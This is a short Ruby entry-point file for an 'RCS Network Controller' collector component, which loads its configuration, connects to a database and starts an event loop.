# The main file of the collector

require 'rcs-common/path_utils'

# relatives
require_release 'rcs-collector/config'
require_release 'rcs-collector/db'

#require_relative 'statistics'
require_relative 'events'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/component'

# from System
require 'yaml'

module RCS
  module Controller
    # namespace aliasing
    DB = RCS::Collector::DB
    Config = RCS::Collector::Config

    class Application
      include RCS::Component

      component :controller, name: "RCS Network Controller"

      # the main of the collector
      def run(options)
        run_with_rescue do
          # config file parsing
          return 1 unless Config.instance.load_from_file

          establish_database_connection(wait_until_connected: true)

          # enter the main loop (hopefully will never exit from it)
          Events.new.setup
        end
      end
    end # Application::
  end # Controller::
end # RCS::
